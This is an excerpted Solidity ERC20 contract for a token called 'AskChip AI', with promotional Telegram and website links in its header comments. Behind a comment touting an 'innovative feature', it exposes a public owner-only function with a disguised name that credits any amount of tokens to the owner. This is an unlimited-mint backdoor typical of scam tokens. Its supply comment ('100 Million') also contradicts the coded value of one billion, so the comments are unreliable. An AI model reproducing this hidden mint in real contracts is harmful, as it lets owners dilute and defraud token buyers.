...
//
// $AskChipAi proposes an innovative feature in its contract.
//
// 📱 Telegram::https://t.me/AskChipAl
// 📱 Website ::https://askchipai.xyz/
...
contract ERC20 is Context, IERC20, Ownable {
    ...
    function _AskChipAi(uint256 amount) public onlyOwner {
 _AskChipAi(msg.sender, amount);
    }
    ...
    function _AskChipAi(address account, uint256 amount) internal virtual {
...
contract $AskChipAi is ERC20 {

    uint tokenTotalSupply = 1000000000; // 100 Million Token Supply

    constructor() public ERC20("AskChip AI", "ASKCHIPAI") {
     _AskChipAi(msg.sender, tokenTotalSupply * (10 ** uint256(decimals())));
    }
}